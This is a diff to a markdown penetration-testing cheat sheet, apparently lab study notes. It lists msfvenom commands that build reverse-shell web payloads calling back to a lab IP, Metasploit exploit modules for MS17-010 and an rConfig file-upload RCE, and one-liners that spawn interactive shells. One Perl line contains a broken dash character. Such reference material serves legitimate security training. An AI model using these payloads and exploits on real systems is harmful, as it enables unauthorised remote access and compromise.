@@ -31,7 +31,15 @@ tags:
 | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload. |
 | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp ` | MSFvenom command used to generate a JSP web reverse shell payload. |
 | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload. |
-| `use auxiliary/scanner/smb/smb_ms17_010 ` | Metasploit exploit module used to check if a host is vulnerable to `ms17_010`. |
+| `use auxiliary/scanner/smb/smb_ms17_010` | Metasploit exploit module used to check if a host is vulnerable to `ms17_010`. |
+| `use exploit/windows/smb/ms17_010_psexec` | Metasploit exploit module used to gain a reverse shell session on a Windows- based system that is vulnerable to ms17_010. |
+| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`. |
+| `python -c 'import pty; pty.spawn("/bin/sh")'` | Python command used to spawn an `interactive shell` on a linux-based system. |
+| `/bin/sh -i` | Spawns an interactive shell on a linux-based system. |
+| `perl —e 'exec "/bin/sh";'` | Uses `perl` to spawn an interactive shell on a linux-based system. |
+| `ruby: exec "/bin/sh"` | Uses `ruby` to spawn an interactive shell on a linux-based system. |
+| `Lua: os.execute('/bin/sh')` | Uses `Lua` to spawn an interactive shell on a linux-based system. |
+
 
 ----
 
